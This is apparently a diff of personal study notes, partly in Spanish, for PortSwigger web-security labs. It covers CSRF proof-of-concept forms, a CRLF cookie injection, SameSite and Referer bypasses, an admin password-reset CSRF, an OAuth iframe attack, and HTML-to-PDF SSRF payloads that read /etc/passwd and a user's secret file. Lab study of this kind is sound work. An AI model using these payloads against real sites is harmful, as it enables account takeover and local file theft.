@@ -1,7 +1,11 @@
+- **Strict 🔒 → Solo dentro del mismo sitio. Más seguro, pero puede romper algunas funcionalidades.**
+- **Lax 🌐 → Permite cookies en enlaces, pero bloquea en formularios y scripts para evitar ataques CSRF.**
+
+---
+
 Basic CSRF:
 Capture request to change email
 Right click > engagement tools > generate CSRF POC
-
 
 - Debes copiar la estructura del formulario de la pagina para luego alterarlo:
 ```html
@@ -195,143 +199,118 @@ document.location=https://cms-0a7c0019032ef6f280b02152006100d7.web-security-acad
 
 ```
 
+---
 
+### CSRF Is Logged In `POST /refreshPassword`
 
-labs stuff ---------------------------------------------------------------
-##### CSRF with method validation
-Capture request to change email
-Change Request method to GET
-Right click > engagement tools > generate CSRF POC
+> If cookie with the **isloggedin** name is _**identified**_, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.
 
-##### CSRF with token being present validation
-Do the same but delete CSRF token
+```html
+POST /refreshpassword HTTP/1.1
+Host: TARGET.net
+Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
+Content-Length: 60
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+Origin: https://TARGET.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+X-Forwarded-Host: EXPLOIT.net
+X-Host: EXPLOIT.net
+X-Forwarded-Server: EXPLOIT.net
+Referer: https://TARGET.net/refreshpassword
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
 
-
-#### CSRF where token is not tied to user session
-The csrf is accepted as long as you provide a csrf token different from your account, as we have 2 accounts, we just use the other account's token to deliver the exploit
-
-#### CSRF with token tied to non-session cookie
-We got csrf token and csrfkey on the cookie
-![[Pasted image 20231030110352.png]]
-If we change both csrf token and key to the ones the other user we have got, we see that we can change the email, this means, the csrfkey is not tied to the cookie session, resulting in a succesfull CSRF through header injection
-
-Now to exploit it, we need to find that header injection in the web
-
-In the search functionality, we find that the search term is specifying a cookie with set cookie
-![[Pasted image 20231030111808.png]]
-![[Pasted image 20231030111816.png]]
-So we can try setting our csrfkey with %0d%0a =```\n```
+csrf=TOKEN&username=administrator
 ```
-GET /?search=hat%0d%0aSet-Cookie:+csrfkey=dmFdSFxP8pg9qmSPAImzttb0uvTF0cQaG
+
+![[Pasted image 20250219161347.png]]
+
+
+### HTML to PDF
+
+> **Identify** a PDF download function and the `source code` uses `JSON.stringify` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial `source code` for JavaScript on the target `downloadReport.js`.
+
+```js
+function downloadReport(event, path, param) {
+
+body: JSON.stringify({
+  [param]: html
+  }
+  )
+  
 ```
-![[Pasted image 20231030112338.png]]
-Successfully changed the csrfkey, now we can create the CSRF POC
-tokens of carlos:
+
+> **Note:** The `<div>` tag defines a division or a section in an HTML document. The
+> 
+> tag is used as a container for HTML elements - which is then styled with CSS. [z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.](https://youtu.be/5djtMMciBlw)
+
+```html
+<div><p>Report Heading by <img src="https://OASTIFY.COM/test.png"></p>
 ```
-csrftoken = mwLNx0eXZOoDjDVMX5ctYFSDFycVYysj
-csrfkey = t7szbWLt4IOkC3ftCnatslM3Loe2Lghv
+
+> Identify file download HTML-to-PDF convert function on target is vulnerable.
+
+```js
+<script>
+	document.write('<iframe src=file:///etc/passwd></iframe>');
+</script>
 ```
-We generate the CSRF POC with csrf token and key from the other acc
-```
+
+> Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).
+
+[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)
+
+> Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as `wkhtmltopdf` to read local file, resulting in [SSRF to Local File Read Exploit in Hassan's blog](http://hassankhanyusufzai.com/SSRF-to-LFI/).
+
+> Thehackerish showing wkHTMLtoPDF exploitation using [root-me.org - Gemini-Pentest-v1](https://www.root-me.org/) CTF lab in the video [Pentest SSRF Ep4](https://youtu.be/Prqt3N5QU2Q?t=345) by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.
+
+![[Pasted image 20250219163530.png]]
+
+```html
 <html>
-  <!-- CSRF PoC - generated by Burp Suite Professional -->
-  <body>
-    <form action="https://0aab005a036dec45801dfd0b0038000e.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="pene&#64;test&#46;com" />
-      <input type="hidden" name="csrf" value="iigFzNlTW6q8KIu7QEcVmdaxjMKfQewe" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
-```
-But we need to do some changes, we need to change through the header injection the csrfkey also
-```
-<html>
-  <!-- CSRF PoC - generated by Burp Suite Professional -->
-  <body>
-    <form action="https://0ab100fb04fa2ec48196707700a800df.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="payload5&#64;payload&#46;com" />
-      <input type="hidden" name="csrf" value="FKZN7u06j0EHKhBRAdwQ35hgdqnV8QRv" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <img src="https://0ab100fb04fa2ec48196707700a800df.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=4oBd8bbzkosP8SpjDgIa4RJeI0IQaZ7U%3b%20SameSite=None" onerror="document.forms[0].submit()">
-	</body>
-</html>
-```
-It will try to load the image with the new cookie, then submit the contents of the POC, as the image is not valid
-If we test it on a tab, we see that the POC works, changing the email succesfully
-The victim uses chrome, so we need to deilver the exploit from chrome
-![[Pasted image 20231030124045.png]]
-
-
-##### SameSite Lax bypass via cookie refresh
-```
-If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately
-Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login
-Bypass the popup blocker
-Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked.
-
-<html>
-  <!-- CSRF PoC - generated by Burp Suite Professional -->
-  <body>
-    <form action="https://0a2000af047ae18382872975000e00e9.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="pitos&#64;pitos&#46;com" />
-    </form>
-		<p>Click Anywhere on the page</p>
-    <script>
-      window.onclick = () => {
-				window.open('https://0a2000af047ae18382872975000e00e9.web-security-academy.net/social-login');
-				setTimeout(changeEmail, 5000);
-			}
-			function changeEmail(){
-				document.forms[0].submit()
-			}
-    </script>
-  </body>
+ <body>
+  <script>
+   x = new XMLHttpRequest;
+   x.onload = function() {
+    document.write(this.responseText)
+   };
+   x.open("GET", "file:///home/carlos/secret");
+   x.send();
+  </script>
+ </body>
 </html>
 ```
 
+> JSON POST request body containing the HTMLtoPDF formatted payload to read local file.
 
-##### CSRF where Referer validation depends on header being present
-Validation depends on referer being present:
-![[Pasted image 20231218105700.png]]
+```json
+{
+ "tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
+}
 ```
-Add meta to CSRF PoC
-<meta name="referrer" content="no-referrer">
-```
 
-##### CSRF with broken Referer validation
-```
-Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
-Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net
-The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string. 
-Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows:
-history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
-To override strip behaviour sed a header:
-Referrer-Policy: unsafe-url
+![[Pasted image 20250219163715.png]]
 
-HTTP/1.1 200 OK
-Content-Type: text/html; charset=utf-8
-Referrer-Policy: unsafe-url
+> Above the display name is injected with `HTML` payload and on export the HTML-to-PDF converter perform SSRF.
 
+> The PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in [HackTricks - Server Side XSS - Dynamic PDF](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) there is cross site scripting and server side exploits documented.
 
-<html>
-  <body>
-    <form action="https://0ae900f403a5771e8151bb9f006e00e2.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="aaaaaaaaaaaaaaaaaa&#64;pito&#46;com" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      history.pushState('', '', '/?0ae900f403a5771e8151bb9f006e00e2.web-security-academy.net');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+### OAuth - IFRAME CSRF
 
+> oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.
 
+[![csrf](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf.png)
+
+> Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. **Drop** the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the `src` attribute points to the URL you just copied.
+
+```html
+<iframe src="https://TARGET.net/oauth-linking?code=STOLEN-CODE"></iframe>
 ```
 
